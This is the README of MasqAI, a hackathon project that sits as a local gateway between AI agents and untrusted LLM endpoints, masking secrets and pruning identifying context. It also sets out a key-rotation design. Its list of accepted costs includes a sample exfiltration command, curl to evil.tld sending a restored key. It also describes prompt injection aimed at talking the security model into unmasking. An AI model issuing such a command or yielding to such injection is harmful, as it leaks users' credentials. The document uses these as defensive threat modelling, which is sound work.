# MasqAI

**A context firewall for AI agents.**

> *Your LLM key is a two-way mirror. MasqAI makes it one-way.*

MasqAI is a gateway that runs entirely on your machine (`127.0.0.1:8787`) and intercepts OpenAI- and
Anthropic-compatible agent traffic. It sits between two models:

- the **untrusted model**, which does your task. It may sit behind a cheap third-party gateway, a reseller, a relay or an opaque agent app.
- the **security model**, trusted and local by default (Ollama), which inspects every request **inline, before anything is forwarded**.

It protects two kinds of information. A **secret** is a concrete string that unlocks or identifies something:
an API key, a password, a path to private data, a username, a device name. **Intel** is something the endpoint
could *conclude* about you: where you live, your host's infrastructure, a design document's contents.
Ordinary data-loss tools catch secrets; MasqAI also stops intel. Secrets are **masked** (reversibly: tool calls
get the real values back locally); intel in tool results is **hidden** or **replaced** (lossy).

Project for HackHarvard 2026, cybersecurity track: *"(de-)cipher"*.

| Part | Where | Status |
|---|---|---|
| Gateway (sanitizer, restore, GUI) | [`masqai/`](masqai/), [`run_gateway.py`](run_gateway.py) · [Running MasqAI](RUNNING.md) | built; `pytest` green |
| Eval harness on Daytona | [`eval/`](eval/README.md) | built; awaiting the full N=20 run |
| Public site (static, synthetic data) | [`web/`](web/README.md) | built; on `main` (Vercel: Root Directory `web`) |
| Playground (six agent tasks + untrusted relay) | [`playground/`](playground/README.md) | built |
| Key Enigma, honeytokens | design below | stretch goals, not built |

Decisions taken where the brief was silent are in [DECISIONS.md](DECISIONS.md); the build plan is [PLAN.md](PLAN.md).
The rest of this document is the design, including the costs we accept and the questions that are still open.

```bash
pip install -r requirements.txt
ollama pull qwen2.5:7b
cp masqai.json.example masqai.json          # keys only by env var NAME, never the value
export OPENROUTER_API_KEY=sk-or-v1-...
python run_gateway.py                        # prints the GUI URL with #token=… once
# point your agent at http://127.0.0.1:8787/v1
```

---

## Why this exists

One of our LLM API keys leaked by accident. Instead of only revoking it, we watched what came through it while
other people used it.

People think of an API key as a billing token. In practice it works as a **two-way channel**. Whoever operates the
endpoint behind a key can see everything sent through it. Coding agents send a lot. Over the course of the incident we saw:

- **OS and hardware fingerprints**, from agents running diagnostic commands and pasting the full output into the prompt.
- **Internal details of the host**, for example the filesystem path to the database of the application an agent was working on.
- **Personal identities**, in some cases the operator's messaging-app username and email address.

From that one key we collected fingerprints of about 40 other keys and information about many remote machines.
The traffic eventually ended up in a self-hosted LLM relay (an open-source API reseller), which we identified from
metadata in the request headers.

> We do not publish any third-party identity or raw data from this incident. Examples in this document are synthetic.

The lesson goes beyond leaked keys. **Anyone who sends context to an endpoint they don't control has the same exposure**:
third-party routers and resellers, free relays, shared team keys, or regulated data sent to any cloud model.

## Two assets, two threats

| Asset | Threatened by | Matters most on |
|---|---|---|
| **The key** (money, quota) | whoever obtains the key | large, widely trusted platforms |
| **The context** (prompts, tool output, files) | whoever operates the endpoint: provider, reseller, relay, or the owner of a borrowed key | smaller platforms and relays |

MasqAI has two components, one for each asset:

- **Sanitizer:** cleans outgoing context with a local model before it leaves the machine.
- **Key Enigma:** keeps rotating the upstream key, so a leaked key stops working soon after it leaks.

```
  agents / tools / apps                MasqAI (local, trusted)                     untrusted
 ┌───────────────────┐   OpenAI or    ┌────────────────────────────────────┐    ┌──────────────────┐
 │ coding agent      │   Anthropic    │ header hygiene                     │    │ provider / relay │
 │ chat client       │ ─────────────▶ │ deterministic detectors            │ ─▶ │ / reseller /     │
 │ browser plugin    │   wire format  │ local LLM: Mask + Rephrase         │    │ chained gateways │
 └───────────────────┘                │ mapping table (RAM only)           │ ◀─ │                  │
          ▲                           │ restore placeholders on the way in │    └──────────────────┘
          └────────────────────────── │ Key Enigma: rotate upstream key    │
                                      └────────────────────────────────────┘
```

---

## Trust model

**Trusted**
- The **RAM** of the gateway process.
- The **local model**, and the policy prompts the user configured.
- The **network link** to the next hop. We assume no man-in-the-middle; the hop itself and everything behind it are untrusted.

**Untrusted**
- The **filesystem**: everything at rest, including config, logs and caches.
- The **upstream** provider or relay, and any gateways chained behind it.
- **Outputs from the remote model.**

**Not in scope**
- **An agent's own actions.** If an agent sends a secret it already holds somewhere else (for example, running `curl` with it),
  that is a matter of the user's tool permissions and prompting. A small local model cannot correct a misbehaving agent,
  or a malicious provider steering one.
- **A compromised gateway host**, such as malware that can read process memory.
- **Network-level identity** (IP address, timing). Use a VPN or Tor for that.

---

## Deployment shapes

1. **Local proxy (core).** Speaks the OpenAI-compatible and Anthropic Messages wire formats. Existing agents and tools
   use it by changing their base URL.
2. **Shared trusted router.** One instance serves a group that trusts each other (a team, a lab, a household).
   Upstream keys never leave the router; members get downstream tokens the router issues.
   This replaces N laptops each holding a key with one place to secure.
3. **Browser plugin.** For non-technical users of chat web interfaces. The plugin sanitizes either through a local
   model (by talking to the local proxy) or through an online sanitizer the user chooses to trust.
   The online option *moves* trust to that provider rather than removing it, and it offers less than the local proxy.

---

## Sanitizer

### Two operations: Mask and Rephrase

Cleaning is split into steps. Each step is one of two operations, and both are carried out only by the local model:

- **Mask (reversible).** Replaces a piece of content directly with a placeholder whose real value is kept in RAM.
  It is a 1-to-1, lossless mapping. The local model also links **fuzzy references** to the same entity, which regex cannot do:

  ```
  sk-or-v1-1234567890abcdef  →  <OR_KEY_913fb303>
  sk-or-v1-123...def         →  <$OR_KEY_913fb303>   (partial form of the same key)
  sk-...def                  →  <$OR_KEY_913fb303>
  ```

- **Rephrase (lossy, depends on the task).** Replaces parts of the context with a cleaned version, by cutting,
  clipping, or summarizing. Traditional data-loss tools ask *"is this a secret?"*. Rephrase asks
  ***"does the remote model need this to solve the current sub-task?"***

  Values such as a username, CPU stepping or hostname aren't secrets in the usual sense, so ordinary filters let them
  through, and those are exactly what fingerprint a machine. If the agent is only looking for a Java binary,
  a full environment dump:

  ```
  > Get-ChildItem Env:

  Name                           Value
  ----                           -----
  ALLUSERSPROFILE                C:\ProgramData
  APPDATA                        C:\Users\alice\AppData\Roaming
  COMPUTERNAME                   DESKTOP-7Q2XK9M
  HOMEPATH                       \Users\alice
  JAVA_HOME                      C:\Program Files\Eclipse Adoptium\jdk-17.0.9.9-hotspot
  LOGONSERVER                    \\DESKTOP-7Q2XK9M
  NUMBER_OF_PROCESSORS           16
  OneDrive                       C:\Users\alice\OneDrive
  Path                           C:\Program Files\Eclipse Adoptium\jdk-17.0.9.9-hotspot\bin;C:\Windows\system32;...
  PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
  PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 186 Stepping 2, GenuineIntel
  USERDOMAIN                     DESKTOP-7Q2XK9M
  USERNAME                       alice
  USERPROFILE                    C:\Users\alice
  ... (40+ more lines)
  ```

  is reduced to:

  ```
  > Get-ChildItem Env:
  …[truncated: Windows system, user-profile and hardware variables]…
  JAVA_HOME                      C:\Program Files\Eclipse Adoptium\jdk-17.0.9.9-hotspot
  …[truncated]…
  Path                           C:\Program Files\Eclipse Adoptium\jdk-17.0.9.9-hotspot\bin;C:\Windows\system32;...
  PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
  …[truncated]…
  ```

  A side effect: agents send a lot of noisy tool output, so Rephrase also cuts down the tokens sent upstream.

**The local model sees both views at once.** At every step it has the raw context and the cleaned context side by side.
That lets it make Mask and Rephrase decisions that stay consistent across the whole conversation.

### Pipeline (local to cloud)

1. **Header hygiene.** Remove or normalize headers that identify the client (user agent, app or client tags, custom metadata).
   Headers are how we identified the relay in our own incident.
2. **Deterministic detectors first.** Regex, entropy checks, secret-scanning rules, and known local identifiers
   (hostname, OS username, home paths, configured emails and handles, the gateway's own admin keys).
   Every match goes into the mapping table before the model runs.
3. **Local LLM pass.** Mask and Rephrase, guided by the active security policy (see below).
4. **Fail closed.** If the model errors, times out, or returns invalid output, the request is blocked, or falls back to
   detector-only cleaning, depending on the preset. It is never sent raw.

### Placeholders and the mapping table

- The mapping table **lives only in RAM**. Each entry holds a canonical value; partial or changed forms are not stored as
  free-standing replacers but as individual masked occurrences, each one pointed at by the local model.
- `<TYPE_id>` stands for an exact copy of the canonical value. `<$TYPE_id>` appears only in the context sent to the
  remote model, and only where the replaced text was a **partial or changed** form (an alias) rather than an exact copy.
  The remote model is not expected to output `<$...>`.
- The `id` is **random, or a keyed hash using a key held only in RAM, and never a plain hash of the value.**
  With a plain hash, the endpoint could confirm guesses for predictable values such as usernames, emails or hostnames.
- The same entity keeps the same placeholder for the whole session.

### Local to remote and back

- **Outbound:** exact copies of a canonical value become placeholders automatically, but never inside a longer word
  (`ANDY` stays in `HANDY`). Partial forms become `<$…>` only at the occurrences the local model marks.
- **Inbound:** placeholders in the model's text and tool-call arguments are restored to their canonical values,
  so the agent's tools act on real data.
- **Streaming:** a placeholder can be split across two chunks of a streamed response. The router holds back only the
  trailing characters that might be the start of a placeholder, and passes everything else through immediately.

### Caching

Agents resend the entire history on every call. Each message is cleaned once and remembered by its content hash.
Identical input always gives identical cleaned output, which keeps the provider's prompt cache working.

The tension is that sometimes something learned later should change a message that was already sent, for example a
partial reference first and the full key afterwards. Rewriting history improves privacy but breaks the cached prefix.
This is a deliberate setting, not something we hide (see *Open questions*).

### Recoverable pruning

Content removed by Rephrase is kept in RAM under an identifier, and the outbound text keeps a short descriptive marker
in its place. A wrong prune can therefore in principle be undone: hidden content stays local but is not thrown away.

### Policy as prompt

The local model's behavior is set by a **prescribed security prompt**. Reading an input under about 1,000 tokens
adds almost no latency for a local model, and the prompt can stay pinned in the model's cache. That makes
**presets** cheap:

| Preset | Intent |
|---|---|
| **Paranoid** | Mask anything identifying, rephrase aggressively, fail closed. |
| **Balanced** | Mask secrets and identity, rephrase noisy tool output. |
| **Eco** | Focus on compressing tokens, with standard secret masking. |
| **Custom** | Advanced users write their own policy. The system does not limit what a policy can say. |

Our order of priorities is **quality first, then speed**. We first show that the local model cleans accurately, then optimize its cost.

---

## Key Enigma: continuous key rotation

A key that only lives for a few minutes is worth little once it leaks.

- **Mechanism.** It uses each provider's key-management API: create a new key, send new requests to it, keep the old
  key alive for a grace period, then revoke it. Provider keys are generated on the provider's servers, so rotation is
  done through the API rather than derived from a local seed.
- **Interval.** Set by the user, fixed or randomly varied. A minimum interval keeps within provider rate limits and
  avoids triggering abuse detection.
- **Grace period.** The old key stays valid until its **last in-flight request finishes**, plus the provider's
  **measured revocation delay**, so streams are never cut off.
- **Usage tracking.** Every rotated key has a stable label, so spending can be added up across rotations.
- **Failure policy.** Configurable. *Fail-open* keeps the current key; *fail-closed* blocks traffic until rotation succeeds.

### The admin key

Rotating keys needs a long-lived credential that can **create** keys. That makes it the most valuable secret in the system.

- It is decrypted **only in RAM**.
- On disk it exists only as ciphertext. It is sealed by a key that never touches the filesystem, derived either from a
  passphrase entered at startup (using a memory-hard key-derivation function) or from the OS keystore or TPM.
- It is never given to agents or downstream clients, and the deterministic detectors watch for it, so it can never be sent upstream.
- Secrets the router creates itself (session keys, downstream tokens, the key used to encrypt stored secrets) come from
  the OS's cryptographically secure random generator, backed by hardware randomness.

### Why it pairs with the shared router

When agents only ever talk to the router, the upstream key never appears in a repository, `.env` file or CI log.
Rotation covers the remaining risk, where keys still have to be handed out to teammates, devices or pipelines.
The router hands out keys, and Key Enigma limits how long each one is worth anything.

---

## Integrations

**Wire formats accepted:** OpenAI-compatible and Anthropic Messages.

**Sanitizer:** works with any upstream that speaks those formats, including self-hosted relays and resellers.
That is where protecting context matters most.

**Key Enigma:** needs a provider API for managing keys. Current targets:

- **Prototype:** OpenAI, Anthropic, OpenRouter
- **Candidates:** Together AI, Fireworks AI, Eden AI, New API (self-hosted relay)

What each platform supports (creating keys, revoking them, how fast revocation takes effect, rate limits) is still being
checked. On some platforms full rotation may not be possible; there we fall back to revoke-only, or Key Enigma is unavailable.

---

## What we give up

These costs are part of the design, and we state them openly.

1. **Rephrasing loses information.** The remote model may miss something it needed, so tasks can fail more often.
2. **Detection is not perfect.** Detectors catch only known patterns, and a small local model will miss some entities.
   One miss is one leak. The goal is *much less exposure*, not *zero*.
3. **Meaning still gets through.** The task, the code logic, the project structure and the writing style still reach the
   endpoint. The sanitizer hides *who* and *where*, not *what you are doing*.
4. **Placeholders lower answer quality.** The remote model reasons about `<USER_DIR_1>` instead of a real path and can't
   learn anything from the path's structure.
5. **Caching versus privacy.** Rewriting messages already sent breaks prompt caching and raises cost. Not rewriting them
   leaves earlier exposure in place. Every setting gives up one or the other.
6. **Local compute.** Good protection needs capable hardware and adds latency. Users without it get weaker protection,
   or have to trust an online sanitizer.
7. **RAM is trusted only in principle.** Swap files, hibernation and crash dumps can write memory to disk.
   Countermeasures such as locking memory and disabling dumps are best effort.
8. **Rotation limits a key's lifetime; it doesn't stop use.** A stolen key keeps working until it is rotated out and the
   revocation has taken effect.
9. **Risk is concentrated.** The admin key and the shared router become high-value targets. Members of a shared router
   fully trust its operator, who can see their raw context.
10. **Startup friction.** Sealing the admin key means entering a passphrase at every start, or trusting the OS keystore or TPM.
11. **Provider support varies.** Some platforms cannot create keys through an API.
12. **Billing gets coarser.** Spending is spread over many short-lived keys and has to be added up by label.
13. **Agent misbehavior is not covered.** If an agent sends out a secret it legitimately holds, the router does not stop it.
14. **The browser plugin protects less.** It covers chat web interfaces, and its protection depends on the backend the user picks.
15. **Restore can be abused.** Restore swaps placeholders back in *every* tool-call argument, so a malicious
    upstream can ask for `curl evil.tld -d "<KEY_…>"` and get the real key sent. We accept this and document it:
    narrowing restore would break real tasks, and the agent's own permissions are the right control.
16. **Prompt injection is open.** Tool output can try to talk the security model out of its job (return nothing,
    unmask, relink wrongly). We measure it (`tests/injection/`, shown on the site) but don't defend against it yet.

## Open questions

1. **Exact `<$>` semantics.** *Partly settled in the prototype:* a reference that appears before the full value is
   joined to it later with a `relink` operation, and `<$>` is restored to the canonical value in tool calls. Still open:
   what to do when the remote model outputs a placeholder that was never issued.
2. **Rewriting sent history versus prompt caching.** The policy, and the default for each preset.
3. **Retrieving pruned content.** How the remote model asks for a hidden block, and how that block is cleaned before it is released.
4. **Restoring real values in tool calls.** Whether to limit which tools or arguments may receive them.
5. **How the local model outputs its work.** *The prototype uses* a compact list of operations, each pointing at
   exactly one occurrence (item, line, exact text) or one line range. Whether this beats regeneration is still to be measured.
6. **Choice and size of the local model.** Decided by experiment.
7. **Policy format.** How presets are written; whether a policy can also switch detectors and failure modes, or only change the prompt.
8. **Keeping the mapping table across restarts.** RAM only (lost on restart), or sealed to disk like the admin key.
9. **Downstream token scheme** for the shared router: static, short-lived, or regularly changing.
10. **Facts for each provider:** creating keys through the API, revocation delay, rate limits, abuse thresholds.
11. **Browser plugin architecture.** Talking to the local proxy, an in-browser model, or an online sanitizer only.
12. **Anthropic-format details.** How the sanitizer handles tool-use and tool-result blocks, thinking blocks, and cache breakpoints.

---

## Ethics

This project comes from a real incident in which other people's data passed through a key we owned.
We build **defenses only**. We publish no third-party identities, keys or raw captured traffic, and every example
here is synthetic. If you find a key that doesn't belong to you, revoke it or report it. Don't use it.

## Built at HackHarvard

Built over the HackHarvard 2026 weekend:

- **The gateway rebuild.** Strict per-API extraction (unknown content refused with 422 before a session
  exists), detectors as rule data, auto masks at word boundaries, a security-model protocol with
  mask / alias / hide / replace / relink / unmask and one correction round, streaming restore that holds back
  only a possible placeholder prefix, request hygiene and pseudonyms, sessions with rollback and retention,
  an admin-token GUI with four tabs, and a replay export for the site.
- **The eval harness** on Daytona: every command the untrusted model asks for runs in a fresh, network-blocked
  sandbox with unique canaries. *MasqAI protects the context; Daytona contains the actions.*
- **The public site**: replay theater, evaluation, how it works, run it.
- **A prompt-injection test set**, measured and reported as a known open issue.

`pytest` covers the core, the proxy end to end, hardening and the harness; `scripts/scan_repo.py` runs MasqAI's
own detectors over the repository in CI so no real-looking secret is committed.
